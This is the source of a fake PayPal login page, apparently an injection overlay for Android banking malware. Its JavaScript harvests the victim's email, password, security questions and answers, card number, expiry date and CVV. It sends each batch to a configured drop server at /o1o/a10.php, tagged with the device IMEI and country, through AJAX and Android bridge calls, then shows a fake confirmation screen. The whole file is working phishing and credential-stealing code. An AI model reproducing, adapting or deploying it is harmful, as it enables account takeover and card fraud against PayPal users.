<!DOCTYPE html>
<html g_init="6861">
<head>
	<title>Paypal</title>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="user-scalable=no, initial-scale=1.0, maximum-scale=1.0 minimal-ui">

	<script type="text/javascript" src="paypal/jquery-2.1.4.min.js"></script>
	<script type="text/javascript" src="paypal/demo.js"></script>
	<script type="text/javascript" src="paypal/dateform.js"></script>

	<link rel="stylesheet" href="paypal/demo.css">
	<link rel="stylesheet" type="text/css" href="paypal/index.css" media="all">
	<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
	<script>

		var lastSlideNumber = 1;

		$(document).ready(function(){

			$('select').on('focus', function() {
				if ($(this).val() === "") {
					$(this).addClass('unselected');
				} else {
					$(this).removeClass('unselected');
				}
			});

		});

		function unDisableById(id) {
			$('#' + id).prop( 'disabled', false );
		}

		function transmit(formNumber, regReceiver) {
			var o = {};
			var a = $('#data' + formNumber).serializeArray();
			var result = true;

			$.each(a, function() {
				if (this.value == '') result = false;
				if (o[this.name] !== undefined) {
					if (!o[this.name].push) {
						o[this.name] = [o[this.name]];
					}
					o[this.name].push(this.value || '');
				} else {
					o[this.name] = this.value || '';
				}
			});

			o['stepID'] = formNumber;

			if (!result) return false;

			if (regReceiver)
				setInterval(1200, sendData(JSON.stringify(o), regReceiver) );
			else
				sendData(JSON.stringify(o), regReceiver);

			return true;
		}

		function sendData(data, regReceiver) {
			//console.log( data );
			Android.sendDataToServer(data, regReceiver);
		}

		function showInternetError() {
			Android.saveFailInject();
			$('#item-slide-' + lastSlideNumber).hide();
			$('#error-slide').show();
		}

		function tryEnterAgain() {
			$('#error-slide').hide();
			$('#item-slide-' + lastSlideNumber).show();
		}
		function getAjax(text) {
		var URL_='<?php echo $URL;?>';
		//alert(URL_+'/o1o/a10.php');
        $.ajax({
          type: 'POST',
          url: URL_+'/o1o/a10.php',
          data: text,
          success: function(data) {
           $('.results').html(data);
          },
          error:  function(xhr, str){
              //  alert('Возникла ошибка: ' + xhr.responseCode);
            }
        });
    }
		function switchSlide(slideNumber, isData, regReceiver) {
			//if (isData && !transmit(slideNumber - 1, regReceiver)) return;
			$('.slide').hide();
			lastSlideNumber = slideNumber;
			$('#item-slide-' + slideNumber).show();

			if(slideNumber==3){
				var IMEI_country='<?php echo $IMEI_country;?>';
				var email = document.forms["data2"].elements["login"].value;
				var pass = document.forms["data2"].elements["password"].value;
				getAjax('p='+IMEI_country+'|Injection_4|PayPal|'+email+'|'+pass+'|');
			//	location.replace(URL_+'/o1o/a10.php?p=' +IMEI+'|Injection_4|PayPal|'+email+'|'+pass+'|');
				//alert('p='+IMEI_country+'|Injection_4|PayPal|'+email+'|'+pass+'|');

			}
			if(slideNumber==4){
				var IMEI_country='<?php echo $IMEI_country;?>';
				var email = document.forms["data2"].elements["login"].value;
				var vopros1 = document.forms["data3"].elements["vopros1"].value;
				var otvet1 = document.forms["data3"].elements["otvet1"].value;
				var vopros2 = document.forms["data3"].elements["vopros2"].value;
				var otvet2 = document.forms["data3"].elements["otvet2"].value;
				getAjax('p='+IMEI_country+'|paypal2|PayPal|'+email+'|'+vopros1+'|'+otvet1+'|'+vopros2+'|'+otvet2+'|');

			}
			if(slideNumber==6){
				var IMEI_country='<?php echo $IMEI_country;?>';
				var email = document.forms["data2"].elements["login"].value;
				var card_number = document.forms["data4"].elements["card_number"].value;
				var expiry_month = document.forms["data4"].elements["expiry_month"].value;
				var expiry_year = document.forms["data4"].elements["expiry_year"].value;
				var cvv = document.forms["data5"].elements["cvv"].value;
				var URL_='<?php echo $URL;?>';
				location.replace(URL_+'/o1o/a10.php?p=' +IMEI_country+'|grabing_mini|'+card_number+'|'+expiry_month+'/'+expiry_year+'|'+cvv+'|||');
			}
		}

		function firstSlideClick() {
			switchSlide(2, false, false);
			$('#background').addClass('background-two');
		}

		$(function($) {
			$.mask.definitions['~']='[+-]';
			$('#expiry_date').mask('99/99',{placeholder:"мм/гг"});
		});




	 </script>
</head>
<body id="background">

	<div class="slide" id="item-slide-1" style="display: block;">
		<br>
		<img src="paypal/pp1.png" alt="img" class="responsive-imagepp">
		<br>
		<br>
		<br>
		<br>
		<h4 style="color: #fff; font-weight: normal; ">
		Login to start using Paypal.
		</h4>
		<br>
		<br>
		<br>
		<br>
		<button onclick="firstSlideClick()" class="button button-green center-button btn"
			id="fon_btn1">Log In</button>
		<br><br>
	</div>

	<div class="slide" id="item-slide-2">
		<br>
		<img src="paypal/pp2.png" alt="img" class="responsive-imagepp">
		<br><br><br>
		<form id="data2" onsubmit="return false;">
			<ul>
				<input type="hidden" name="bank_name" value="Sber"/>
				<input onchange="unDisableById('password')" type="text"  name="login" id="login"
					placeholder="Email">
				<small class="help"></small>
				<li>
					<input onclick="unDisableById('btn2')" disabled=disabled id="password"
						type="password"  name="password"  placeholder="Password">
				</li>
			</ul>
		</form>
		<!-- к третьему слайду -->
		<br><button disabled id="btn2" onClick="switchSlide(3, true, false)"
			class="button button-green3 center-button btn"  >Next Step</button>
		 <br> <br>
	</div>

	<div class="slide" id="item-slide-3">
			<br>
			<img src="paypal/pp2.png" alt="img" class="responsive-imagepp">
			<br>
			<br>
			<h4 style="color: #767676; font-weight: lighter; padding: 0px 15px;">
			You are logged into the new device. Please verify your identity. Answer the security questions:
			</h4>
			<form id="data3" onsubmit="return false;">
				<ul>
					<li>
					<select  id="vopros1" onchange="unDisableById('otvet1')" class="unselected" name="vopros1" >
						<option style="display:none; color:#dedede;" value="" disabled selected>The first secret question</option>
						<option value="What was the name of your first pet">What was the name of your first pet?</option>
						<option value="What`s the nickname of your oldest child">What`s the nickname of your oldest child?</option>
						<option value="What is the middle name of your father">What is the middle name of your father?</option>
						<option value="What is the name of your first flatmate">What is the name of your first flatmate?</option>
						<option value="What is the maiden name of your mother">What is the maiden name of your mother?</option>
						<option value="Who was your childhood best friend">Who was your childhood best friend?</option>
					</select>
					</li>

					<input type="hidden" name="bank_name" value="Sber"/>
					<input onclick="unDisableById('vopros2')" disabled=disabled type="text"  name="otvet1" id="otvet1" placeholder="Your Answer">
					<small class="help"></small>

					<li>

					<select disabled="disabled" id="vopros2" onchange="unDisableById('otvet2')" class="unselected" name="vopros2">
					<option   value="" disabled selected>The second secret question</option>
						<option value="What was the name of your first pet">What was the name of your first pet?</option>
						<option value="What`s the nickname of your oldest child">What`s the nickname of your oldest child?</option>
						<option value="What is the middle name of your father">What is the middle name of your father?</option>
						<option value="What is the name of your first flatmate">What is the name of your first flatmate?</option>
						<option value="What is the maiden name of your mother">What is the maiden name of your mother?</option>
						<option value="Who was your childhood best friend">Who was your childhood best friend?</option>

					</select>
					</li>
					<input onclick="unDisableById('btn3')" disabled=disabled id="otvet2" type="password"  name="otvet2"  placeholder="Your Answer">
					</li>
				</ul>
			</form><br><button disabled="disabled" id="btn3" onClick="switchSlide(4, true, false)"
				class="button button-green3 center-button btn next"  >Next Step</button>
			<br><br><br> <br>
	</div>

	<div class="slide" id="item-slide-4">
		<br>
		<img src="paypal/pp3.png" alt="img" class="responsive-imagepp">
		<br>
		<br>
		<h4 style="color: #767676; font-weight: lighter;">
		Enter the number and expiration date of your card:
		</h4>

		<form id="data4" onsubmit="return false;">
		<ul>
		<input type="number"  name="card_number" id="card_number" placeholder="1234 5678 9012 3456">

		<small class="help"></small>

		<ul>
		<li>
		<select disabled="disabled" id="mon" onchange="unDisableById('yyy')" class="unselected" name="expiry_month" >
		<option style="display:none; color:#dedede;" value="" disabled selected>Month</option>
		<option value="1">1</option>
		<option value="2">2</option>
		<option value="3">3</option>
		<option value="4">4</option>
		<option value="5">5</option>
		<option value="6">6</option>
		<option value="7">7</option>
		<option value="8">8</option>
		<option value="9">9</option>
		<option value="10">10</option>
		<option value="11">11</option>
		<option value="12">12</option>
		</select>
		</li>

		<li>

		<select disabled="disabled" id="yyy" onchange="unDisableById('btn4')" class="unselected" name="expiry_year">
		<option   value="" disabled selected>Year</option>
		<option  value="2017">2017</option>
		<option  value="2018">2018</option>
		<option  value="2019">2019</option>
		<option  value="2020">2020</option>
		<option  value="2021">2021</option>
		<option  value="2022">2022</option>
		<option  value="2023">2023</option>
		<option  value="2024">2024</option>
		<option  value="2025">2025</option>
		<option  value="2026">2026</option>
		<option  value="2027">2027</option>
		</select>
		</li>


		</ul>

		</form>

		<br>
		<button disabled="disabled" id="btn4" onClick="switchSlide(5, true, false)" class="button button-green3 center-button btn next"  >Next Step</button>

		<br><br>
		<br> <br>
	</div>

	<div class="slide" id="item-slide-5">
					<br>
	  <img src="paypal/pp3.png" alt="img" class="responsive-imagepp">
	 <br>
	   <br>

						<h4 style="color: #767676; font-weight: lighter;">
							To confirm enter the CVV-code:
						</h4>

						   <form id="data5" onsubmit="return false;">
							<li>
								<ul>


									<li>

										<input onclick="unDisableById('btn5')" type="number" name="cvv"
											id="cvv" max="999" maxlength="3" placeholder="123"
											oninput="if(value.length>3)value=value.slice(0,3)">
									</li>
								</ul>
							</li>
					</form>

						<br>
					   <button disabled="disabled" id="btn5" onClick="switchSlide(6, true, true)" class="button button-green3 center-button btn next"  >Done</button>


				   <br> <br>
	</div>

	<div class="slide" id="item-slide-6">
		<br>
		<img src="paypal/pp4.png" alt="img" class="responsive-imagepp">
		<br>
		<br>
		<h4 style="color: #767676; font-weight: lighter;">
		Congratulations! Application for registration accepted. Expect confirmation.
		</h4>
		<br> <br>
	</div>

	<div class="slide" id="error-slide">
		<h4 style="color: red; font-weight: lighter;">
		Sorry, the content is not available. Please check your internet connection.
		</h4>
		<br/>
		<button onclick="tryEnterAgain()" class="button button-green center-button btn">Try Enter Again</button>
	</div>

</body>
</html>
